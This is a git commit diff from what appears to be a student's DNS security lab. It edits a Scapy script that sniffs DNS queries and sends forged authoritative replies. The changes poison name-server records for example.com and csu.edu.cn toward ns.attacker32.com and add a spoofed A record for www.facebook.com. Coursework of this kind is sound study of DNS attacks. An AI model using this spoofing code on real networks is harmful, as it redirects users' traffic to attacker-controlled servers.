2817a1bd32dc11e8c1b9ab2d9c016df7c85448af
xtliu <609358001@qq.com>
2023-11-12 05:27:25 -0500

    AFTER DNS_LOCAL

--- lab2/DNS_local/volumes/dns_sniff_spoof.py
+++ lab2/DNS_local/volumes/dns_sniff_spoof.py
@@ -3,7 +3,7 @@ from scapy.all import *
 
 def spoof_dns(pkt):
   if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
-
+    
     # Swap the source and destination IP address
     IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
 
@@ -15,26 +15,30 @@ def spoof_dns(pkt):
                  ttl=259200, rdata='10.0.2.5')
 
     # The Authority Section
-    NSsec1 = DNSRR(rrname='example.net', type='NS',
-                   ttl=259200, rdata='ns1.example.net')
-    NSsec2 = DNSRR(rrname='example.net', type='NS',
-                   ttl=259200, rdata='ns2.example.net')
+    NSsec1 = DNSRR(rrname='example.com', type='NS',
+                   ttl=259200, rdata='ns.attacker32.com')
+    NSsec2 = DNSRR(rrname='csu.edu.cn', type='NS',
+                   ttl=259200, rdata='ns.attacker32.com')                   
 
     # The Additional Section
     Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                     ttl=259200, rdata='1.2.3.4')
     Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                     ttl=259200, rdata='5.6.7.8')
+    Addsec3 = DNSRR(rrname='www.facebook.com', type='A',
+                    ttl=259200, rdata='9.9.9.9')                    
 
     # Construct the DNS packet
     DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
-                 qdcount=1, ancount=1, nscount=2, arcount=2,
-                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
+                 qdcount=1, ancount=1, nscount=2, arcount=3,
+                 an=Anssec, ns=NSsec2/NSsec1, ar=Addsec1/Addsec2/Addsec3)
 
     # Construct the entire IP packet and send it out
     spoofpkt = IPpkt/UDPpkt/DNSpkt
     send(spoofpkt)
+    
+  
 
 # Sniff UDP query packets and invoke spoof_dns().
-f = 'udp and dst port 53'
-pkt = sniff(iface='br-2f902169a472', filter=f, prn=spoof_dns)      
+f = 'udp and dst port 53 '
+pkt = sniff(iface='br-5f818d42a713', filter=f, prn=spoof_dns)      
